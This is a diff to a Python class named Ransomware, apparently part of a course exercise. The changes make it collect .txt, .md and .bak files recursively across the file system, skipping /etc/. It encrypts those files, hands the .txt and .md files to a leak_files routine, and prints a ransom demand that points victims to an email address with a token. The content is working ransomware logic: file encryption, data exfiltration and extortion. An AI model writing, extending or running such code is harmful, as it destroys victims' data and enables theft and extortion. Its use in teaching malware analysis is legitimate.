@@ -32,10 +32,16 @@ class Ransomware:
         # return all files matching the filter
         """files_list is a list containing the paths of every file found recursively by the rglob() function in the file system.
         The paths are stored as strings."""
+        
+        # file_list = [str(p) for p in list(Path().rglob(filter))]
+        file_list = []
+        for p in Path().rglob(filter):
+            if "/etc/" in str(p):
+                continue
+            file_list.append(str(p)) 
 
-        files_list = [str(p) for p in list(Path().rglob(filter))]
-
-        return files_list
+        self._log.debug(file_list)
+        return file_list
 
     def encrypt(self) -> None:
         # main function for encrypting (see PDF)
@@ -45,8 +51,9 @@ class Ransomware:
 
         files_to_encrypt = []
         files_to_encrypt.extend(self.get_files("*.txt"))
-        # files_to_encrypt.extend(self.get_files("*.bak"))
         files_to_encrypt.extend(self.get_files("*.md"))
+        files_to_leak = files_to_encrypt.copy()
+        files_to_encrypt.extend(self.get_files("*.bak"))
 
         self._log.debug(files_to_encrypt)
 
@@ -58,7 +65,7 @@ class Ransomware:
         print(f"Your txt files have been encrypted! Please send an email to support@igotpwned.com with object '{token}' to retrieve your data.")
         print(HERE_WIPE_YOUR_TEARS)
         print(ASCII_TISSUE_BOX)
-        self._secret_manager.leak_files(files_to_encrypt)
+        self._secret_manager.leak_files(files_to_leak)
         return None
     
     def add_reminder_to_bashrc(self, path: str) -> None:
@@ -80,7 +87,7 @@ class Ransomware:
         # self._secret_manager.set_key(candidate_key)
         files_to_decrypt = []
         files_to_decrypt.extend(self.get_files("*.txt"))
-        # files_to_decrypt.extend(self.get_files("*.bak"))
+        files_to_decrypt.extend(self.get_files("*.bak"))
         files_to_decrypt.extend(self.get_files("*.md"))
 
         self._secret_manager.xorfiles(files_to_decrypt)
